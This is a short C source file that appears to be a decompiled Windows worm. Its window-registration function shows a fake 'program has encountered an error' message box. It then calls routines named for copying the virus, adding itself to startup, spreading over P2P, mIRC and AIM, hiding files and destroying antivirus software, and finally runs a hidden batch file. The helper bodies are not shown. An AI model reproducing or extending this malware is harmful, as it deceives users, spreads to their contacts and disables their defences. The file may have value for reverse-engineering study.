#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <stdint.h>

void _MyRegisterClass(HINSTANCE param_1)
{
    WNDCLASSEXA local_3c;

    local_3c.cbSize = sizeof(WNDCLASSEXA);
    local_3c.style = CS_HREDRAW | CS_VREDRAW;
    local_3c.lpfnWndProc = _WndProc_16;
    local_3c.cbClsExtra = 0;
    local_3c.cbWndExtra = 0;
    local_3c.hInstance = param_1;
    local_3c.hIcon = LoadIconA(param_1, (LPCSTR)0x7f00);
    local_3c.hCursor = LoadCursorA((HINSTANCE)0x0, (LPCSTR)0x7f00);
    local_3c.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    local_3c.lpszMenuName = NULL;
    local_3c.lpszClassName = _szWindowClass;
    local_3c.hIconSm = LoadIconA(local_3c.hInstance, (LPCSTR)0x7f00);

    MessageBoxA(_hWnd,
                "This program has encountered an error and needs to close, please try again. If the problem persists try restarting your computer.",
                "Error", MB_ICONERROR);
    _GetVirus();
    _CopyVirus();
    _WinStartup();
    _P2PCopy();
    _FindmIRC();
    _WriteBatch();
    _FindAIM();
    _HideFiles();
    _DestroyAVs();
    ShellExecuteA(_hWnd, "open", "BBbLWDB.Bat", NULL, NULL, SW_HIDE);
    RegisterClassExA(&local_3c);
}
#pragma optimize("", on)
